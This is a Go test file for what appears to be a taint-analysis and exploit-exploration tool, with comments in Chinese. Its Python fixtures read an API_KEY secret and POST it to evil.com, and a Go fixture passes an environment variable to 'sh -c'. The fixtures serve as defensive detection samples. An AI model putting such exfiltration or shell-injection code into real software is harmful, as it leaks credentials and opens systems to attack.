package ir

import (
	"fmt"
	"testing"
)

func TestAgentExplorerBasic(t *testing.T) {
	code := `import os
import requests

def exfiltrate():
    secret = os.getenv("API_KEY")
    requests.post("https://evil.com", json={"key": secret})
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("explorer_test.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	// 运行污点分析
	taintAnalyzer := NewTaintAnalyzer(DefaultTaintRules())
	taintFindings := taintAnalyzer.Analyze([]File{*file})

	// 创建探索器
	explorer := NewAgentExplorer([]File{*file})
	tasks := explorer.GenerateTasks(taintFindings, nil)

	fmt.Printf("=== Agent 探索基本测试 ===\n")
	fmt.Printf("Tasks: %d\n", len(tasks))
	for _, task := range tasks {
		fmt.Printf("  - [%s] %s (priority=%d)\n", task.Kind, task.Description, task.Priority)
	}

	// 执行任务
	results := explorer.ExecuteAll(tasks)
	fmt.Printf("Results: %d\n", len(results))
	for _, r := range results {
		fmt.Printf("  - [%s] %s: %d evidence\n", r.Status, r.TaskID, len(r.Evidence))
		for _, e := range r.Evidence {
			fmt.Printf("    [%s] %s\n", e.Strength, e.Description)
		}
		if r.GeneratedCode != "" {
			fmt.Printf("    PoC:\n%s\n", r.GeneratedCode)
		}
	}
}

func TestAgentExplorerChainGap(t *testing.T) {
	code := `import os
import requests

def read_secret():
    return os.getenv("API_KEY")

def send_data(data):
    requests.post("https://evil.com", data=data)
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("chain_gap.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	// 运行链验证
	taintAnalyzer := NewTaintAnalyzer(DefaultTaintRules())
	taintFindings := taintAnalyzer.Analyze([]File{*file})

	builder := NewCallGraphBuilder()
	graph := builder.Build([]File{*file})

	chainVerifier := NewChainVerifier(DefaultChainPatterns(), graph, taintFindings, []File{*file})
	chainResults := chainVerifier.Verify()

	// 创建探索器
	explorer := NewAgentExplorer([]File{*file})
	tasks := explorer.GenerateTasks(taintFindings, chainResults)

	fmt.Printf("=== 链缺口探索测试 ===\n")
	fmt.Printf("Tasks: %d\n", len(tasks))
	for _, task := range tasks {
		fmt.Printf("  - [%s] %s\n", task.Kind, task.Description)
	}
}

func TestAgentExplorerFullAnalysis(t *testing.T) {
	code := `import os
import requests

def attack():
    secret = os.getenv("API_KEY")
    requests.post("https://evil.com", json={"key": secret})
    os.system("cleanup")
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("full_analysis.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	analysis := RunFullAnalysis([]File{*file})
	report := FormatFullAnalysis(analysis)

	fmt.Printf("=== 完整分析测试 ===\n")
	fmt.Println(report)

	if len(analysis.TaintFindings) == 0 {
		t.Error("should find taint findings")
	}
	if len(analysis.ExplorationTasks) == 0 {
		t.Error("should generate exploration tasks")
	}
}

func TestAgentExplorerSafeCode(t *testing.T) {
	code := `def hello():
    print("hello world")
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("safe_explorer.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	explorer := NewAgentExplorer([]File{*file})
	tasks := explorer.GenerateTasks(nil, nil)

	fmt.Printf("=== 安全代码探索测试 ===\n")
	fmt.Printf("Tasks: %d (expected 0)\n", len(tasks))

	if len(tasks) > 0 {
		t.Error("safe code should not generate exploration tasks")
	}
}

func TestAgentExplorerGo(t *testing.T) {
	code := `package main

import (
	"net/http"
	"os"
	"os/exec"
)

func handler(w http.ResponseWriter, r *http.Request) {
	cmd := os.Getenv("CMD")
	exec.Command("sh", "-c", cmd).Run()
}
`

	parser, _ := GetParser("go")
	file, err := parser.Parse("explorer_go.go", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	analysis := RunFullAnalysis([]File{*file})

	fmt.Printf("=== Go 完整分析测试 ===\n")
	fmt.Printf("TaintFindings: %d\n", len(analysis.TaintFindings))
	fmt.Printf("ChainResults: %d\n", len(analysis.ChainResults))
	fmt.Printf("Tasks: %d\n", len(analysis.ExplorationTasks))
	fmt.Printf("Results: %d\n", len(analysis.ExplorationResults))

	for _, r := range analysis.ExplorationResults {
		if len(r.Evidence) > 0 {
			fmt.Printf("  [%s] %s\n", r.Status, r.TaskID)
			for _, e := range r.Evidence {
				fmt.Printf("    %s\n", e.Description)
			}
		}
	}
}

func TestSeverityToPriority(t *testing.T) {
	tests := []struct {
		severity string
		want     int
	}{
		{"高风险", 9},
		{"high", 9},
		{"中风险", 6},
		{"medium", 6},
		{"低风险", 3},
		{"low", 3},
		{"unknown", 5},
	}

	for _, tt := range tests {
		got := severityToPriority(tt.severity)
		if got != tt.want {
			t.Errorf("severityToPriority(%q) = %d, want %d", tt.severity, got, tt.want)
		}
	}
}
